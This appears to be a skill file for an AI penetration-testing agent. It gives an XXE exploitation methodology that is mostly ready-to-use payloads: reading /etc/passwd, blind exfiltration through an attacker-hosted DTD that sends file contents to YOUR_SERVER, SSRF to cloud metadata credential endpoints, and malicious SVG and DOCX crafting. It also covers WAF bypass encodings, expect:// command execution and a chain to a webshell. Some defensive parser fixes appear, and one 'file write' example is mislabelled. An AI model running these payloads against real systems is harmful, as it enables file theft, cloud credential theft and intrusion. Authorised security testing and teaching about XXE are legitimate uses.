---
name: xxe-expert
description: ULTIMATE XXE exploitation methodology — file read, blind OOB, SSRF via XXE, parameter entity injection, XInclude, SVG/DOCX, WAF bypass.
---

# XXE (XML External Entity) — THE COMPLETE GUIDE

## Decision Tree
```
1. Application processes XML?
   ├── DOCTYPE allowed? → Classic XXE / Blind XXE
   │   ├── Output visible? → Inline XXE file read
   │   ├── Error visible? → Error-based XXE exfiltration
   │   └── Neither? → OOB blind XXE via parameter entities
   ├── DOCTYPE blocked? → XInclude attack
   ├── SVG upload? → XXE via SVG XML
   └── Office doc upload? → XXE via DOCX/XLSX XML

2. Protocol availability?
   ├── file:// → Read files (all parsers)
   ├── php://expect → RCE (PHP expect module)
   ├── php://filter → Base64-encode file read (PHP)
   ├── compress.zlib:// → Read gzipped files
   └── ftp:// → OOB exfiltration (Java)

3. Blind detection needed?
   ├── OOB via parameter entities → Host DTD on attacker server
   ├── Error-based → Trigger schema error with file contents
   └── HTTP/FTP callback → Exfil via outbound connection
```

## Detection Payloads

### Classic XXE File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Basic Tests
```xml
<!-- Direct entity test -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY test "XXE_OK">]>
<root>&test;</root>

<!-- External entity test -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```

## File Read Protocols
```
# PHP wrappers
file:///etc/passwd                     # Basic file read
php://filter/convert.base64-encode/resource=/etc/passwd  # Base64-encoded read (bypasses binary issues)
php://expect://id                      # RCE if expect module loaded
php://input                            # Read POST body as file
compress.zlib://file:///etc/passwd     # Read gzipped files

# Java
file:///etc/passwd
file:///C:/Windows/win.ini

# .NET
file:///etc/passwd                     # Default; restricted to file://

# Python (lxml)
file:///etc/passwd                     # Works with lxml; defusedxml blocks it
```

## Blind XXE Detection

### OOB via Parameter Entity (requires attacker-controlled DTD server)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER.dtd">
  %xxe;
]>
<foo>&callhome;</foo>
```

On your server, DTD file:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % callhome "<!ENTITY callhome SYSTEM 'http://YOUR_SERVER/?data=%file;'>">
%callhome;
```

### OOB Netdoc Protocol (Java)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
]>
```

### Blind Detection via Collaborator
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOURID.burpcollaborator.net/test">
]>
<foo>&xxe;</foo>
```

## Parameter Entity Injection (Error-Based Exfiltration)
Trigger an error message that leaks file contents:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>
```

The error message will contain the file contents as part of the path error.

## SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

### Common SSRF Targets
```
# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal Services
http://localhost:8080/admin
http://127.0.0.1:3000/
http://0.0.0.0:6379/                           # Redis
http://localhost:9200/                          # Elasticsearch
http://localhost:5432/                          # PostgreSQL
```

## XInclude (When DOCTYPE Is Blocked)
If DOCTYPE declarations are blocked, try XInclude:
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### XInclude SSRF
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</root>
```

## SVG Upload XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="20" y="20">&xxe;</text>
</svg>
```

## DOCX/XLSX Office XML XXE
DOCX, XLSX, and PPTX files are ZIP archives containing XML. Inject a DTD into one of the XML files:

1. Unzip the document: `unzip document.docx -d docx_extracted/`
2. Add XXE to `word/document.xml`:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document>&xxe;</w:document>
```
3. Re-zip: `cd docx_extracted && zip -r ../malicious.docx *`

## WAF / Input Validation Bypass

### UTF-7 Encoding
```xml
<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
UTF-7 can encode DOCTYPE in a way that bypasses regex filters:
```
+ADw-?xml version+AD0AIg-1.0+ACI- encoding+AD0AIg-UTF-7+ACI-?+AD4-
+ADw-!DOCTYPE foo [+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-]+AD4-
+ADw-foo+AD4-&xxe;+ADw-/foo+AD4-
```

### UTF-16 BOM (Byte Order Mark)
Many WAFs check for UTF-8 but pass UTF-16:
```python
# In Python: encode XML as UTF-16
xml_utf16 = xml_string.encode('utf-16')
```

### Parameter Entities + CDATA (bypass bad character filters)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY filewrap '%start;%file;%end;'>">
  %all;
]>
<foo>&filewrap;</foo>
```

### Chunked + Entity Encoding
```xml
&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45; ...
```

## Per-Language Differences

### PHP
```xml
<!-- PHP simplexml, DOMDocument are vulnerable by default -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "php://input">
```
Fix: `libxml_disable_entity_loader(true)` in PHP < 8.0

### Java (SAX/DOM/StAX)
```xml
<!-- Java XML parsers are vulnerable by default -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "ftp://attacker.com/path">
```
Fix: Explicitly set `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`

### .NET
```xml
<!-- .NET Framework < 4.5.2: vulnerable by default -->
<!-- .NET Framework >= 4.5.2: XmlReaderSettings in secure mode blocks XXE -->
```
Fix: Set `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`

### Python
```python
# lxml: vulnerable
from lxml import etree
etree.fromstring(xml_data)     # vulnerable

# defusedxml: safe
from defusedxml import lxml as defused_etree
defused_etree.fromstring(xml_data)  # blocks XXE
```

## XXE to RCE Chains

### PHP expect:// RCE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

### PHP file write (via SSRF to local write endpoint)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
```

Combine XXE with SSRF to write files: XXE → SSRF → internal API with file write → webshell.

## Tool Methodology
```bash
# xxexploiter - automated XXE exploitation
xxexploiter generate file /etc/passwd http://YOUR_SERVER/ COLLABORATOR_ID

# Manual DTD hosting for OOB
python3 -m http.server 8080  # Serve DTD from attacker machine

# Interactsh for OOB detection
interactsh-client

# Burp Collaborator for blind XXE detection
# Use the Collaborator payload in ENTITY SYSTEM URL
```

## Evidence Collection
```bash
cat > exploit/<finding-id>/xxe-payload.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
EOF

# Save the raw request
cat > exploit/<finding-id>/request.xml << 'EOF'
POST /api/xml HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
EOF

# Save the response showing leaked data
# Screenshot if needed
```
